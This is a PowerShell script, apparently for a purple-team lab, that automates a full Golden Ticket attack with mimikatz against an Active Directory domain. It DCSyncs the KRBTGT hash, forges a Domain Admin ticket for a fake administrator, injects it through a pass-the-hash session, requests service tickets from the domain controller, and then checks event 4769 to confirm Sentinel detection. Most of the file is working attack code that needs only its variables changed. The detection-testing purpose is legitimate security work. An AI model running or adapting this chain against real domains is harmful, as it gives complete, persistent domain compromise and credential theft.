param()
# Run-GoldenTicketAttack.ps1 - Golden Ticket simulation using fresh logon session

$MIMIKATZ = "C:\Tools\mimikatz\x64\mimikatz.exe"
$LOG_DIR  = "C:\SecurityLogs\AttackSim"
$KIRBI    = "C:\Temp\fake.kirbi"
$BAT_FILE = "C:\Temp\run-gt-inner.bat"
$MARKER   = "C:\Temp\gt-attack-done.txt"
$DOMAIN   = "corp.local"
$DC_FQDN  = "WIN-09GD99A8DPG.corp.local"
$DOM_SID  = "S-1-5-21-3406634861-1234809508-3516503270"

foreach ($d in @("C:\Temp", $LOG_DIR)) {
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
}
foreach ($f in @($KIRBI, $BAT_FILE, $MARKER)) {
    if (Test-Path $f) { Remove-Item $f -Force }
}

$LOG_FILE = "$LOG_DIR\attack-$(Get-Date -Format 'yyyyMMdd-HHmmss').log"
function Log($msg) {
    $line = "[$(Get-Date -Format 'HH:mm:ss')] $msg"
    Write-Host $line
    Add-Content -Path $LOG_FILE -Value $line -Encoding UTF8
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Red
Write-Host "  GOLDEN TICKET SIMULATION (v2 - fresh session)" -ForegroundColor Red
Write-Host "  $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Red
Write-Host "============================================================" -ForegroundColor Red
Write-Host ""

# Step 1: Get KRBTGT hash via DCSync
Log "[1/5] DCSync to extract KRBTGT hash..."
$mimi1 = (& $MIMIKATZ "privilege::debug" "lsadump::dcsync /domain:$DOMAIN /user:krbtgt" "exit") -join "`n"
Add-Content -Path $LOG_FILE -Value $mimi1 -Encoding UTF8
$krbtgtHash = ([regex]::Match($mimi1, "Hash NTLM: ([a-f0-9]{32})")).Groups[1].Value
if (-not $krbtgtHash) { Log "ERROR: Could not extract KRBTGT hash"; exit 1 }
Log "  Hash: $($krbtgtHash.Substring(0,8))************************"

# Step 2: Export Golden Ticket to kirbi file (NOT /ptt)
Log "[2/5] Forging Golden Ticket with RC4 and exporting to kirbi file..."
$gtArg = "kerberos::golden /user:FakeAdmin /domain:$DOMAIN /sid:$DOM_SID /rc4:$krbtgtHash /id:500 /groups:512,520,518,519,513 /ticket:$KIRBI"
$mimi2 = (& $MIMIKATZ "privilege::debug" $gtArg "exit") -join "`n"
Add-Content -Path $LOG_FILE -Value $mimi2 -Encoding UTF8
if (Test-Path $KIRBI) {
    Log "  Exported: $KIRBI ($([math]::Round((Get-Item $KIRBI).Length/1KB,1)) KB)"
} else {
    Log "ERROR: kirbi not created"; exit 1
}

# Step 3: Write inner batch file that runs inside the new FakeAdmin session
Log "[3/5] Writing inner batch file for FakeAdmin session..."
$batLines = @(
    "@echo off",
    "$MIMIKATZ `"privilege::debug`" `"kerberos::ptt $KIRBI`" `"kerberos::ask /target:cifs/$DC_FQDN`" `"kerberos::ask /target:host/$DC_FQDN`" `"kerberos::ask /target:ldap/$DC_FQDN`" `"kerberos::ask /target:http/$DC_FQDN`" `"kerberos::ask /target:rpcss/$DC_FQDN`" `"kerberos::ask /target:wsman/$DC_FQDN`" exit",
    "echo done > $MARKER"
)
Set-Content -Path $BAT_FILE -Value ($batLines -join "`r`n") -Encoding ASCII
Log "  Batch file written: $BAT_FILE"

# Step 4: Spawn new logon session via sekurlsa::pth and run inner batch
Log "[4/5] Spawning fresh FakeAdmin session via sekurlsa::pth..."
Log "  This creates a new logon with empty Kerberos cache."
Log "  FakeAdmin kirbi is the only ticket - KDC logs FakeAdmin in EventID 4769."
$pthArg = "sekurlsa::pth /user:FakeAdmin /domain:$DOMAIN /ntlm:aad3b435b51404eeaad3b435b51404ee /run:$BAT_FILE"
$mimi3 = (& $MIMIKATZ "privilege::debug" $pthArg "exit") -join "`n"
Add-Content -Path $LOG_FILE -Value $mimi3 -Encoding UTF8

Log "  Waiting up to 30s for inner process to complete..."
$waited = 0
while (-not (Test-Path $MARKER) -and $waited -lt 30) {
    Start-Sleep -Seconds 2
    $waited += 2
}
if (Test-Path $MARKER) {
    Log "  Completed in ${waited}s."
} else {
    Log "  Timed out - events may still have been generated."
}

# Step 5: Verify events in Windows Security Event Log
Log "[5/5] Checking Windows Event Log for FakeAdmin 4769 events..."
Start-Sleep -Seconds 3
$since = (Get-Date).AddMinutes(-3)
$all4769 = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4769; StartTime=$since} -ErrorAction SilentlyContinue

$fakeEvts = @()
foreach ($evt in $all4769) {
    $xml = [xml]$evt.ToXml()
    $user = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "TargetUserName" }).'#text'
    if ($user -match "FakeAdmin") { $fakeEvts += $evt }
}

Log "  Total 4769 events (last 3 min): $($all4769.Count)"
Log "  FakeAdmin 4769 events: $($fakeEvts.Count)"

if ($fakeEvts.Count -gt 0) {
    Write-Host ""
    Write-Host "  [DETECTION CONFIRMED]" -ForegroundColor Green
    foreach ($evt in $fakeEvts) {
        $xml = [xml]$evt.ToXml()
        $user = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "TargetUserName" }).'#text'
        $svc  = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "ServiceName" }).'#text'
        $enc  = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "TicketEncryptionType" }).'#text'
        Log "    $($evt.TimeCreated) | User:$user | Svc:$svc | Enc:$enc"
    }
} else {
    Write-Host "  [WARN] No FakeAdmin events in log yet - AMA ingestion lag, check Sentinel in 5 min." -ForegroundColor Yellow
    foreach ($evt in ($all4769 | Select-Object -First 5)) {
        $xml = [xml]$evt.ToXml()
        $user = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "TargetUserName" }).'#text'
        $svc  = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "ServiceName" }).'#text'
        $enc  = ($xml.Event.EventData.Data | Where-Object { $_.Name -eq "TicketEncryptionType" }).'#text'
        Log "    $user | $svc | Enc:$enc"
    }
}

Write-Host ""
Write-Host "============================================================" -ForegroundColor Red
Write-Host "  ATTACK COMPLETE" -ForegroundColor Red
Write-Host "============================================================" -ForegroundColor Red
Log "Technique: Golden Ticket RC4 (0x17), FakeAdmin SID-500, DA groups, 10yr validity"
Log "Triggers:  gt-rc4-downgrade (Enc=0x17) + gt-ptt-detection (no prior 4768)"
Log "Log file:  $LOG_FILE"
Write-Host ""
Write-Host "Sentinel alerts expected within 5-10 min (PT5M rules)." -ForegroundColor Yellow
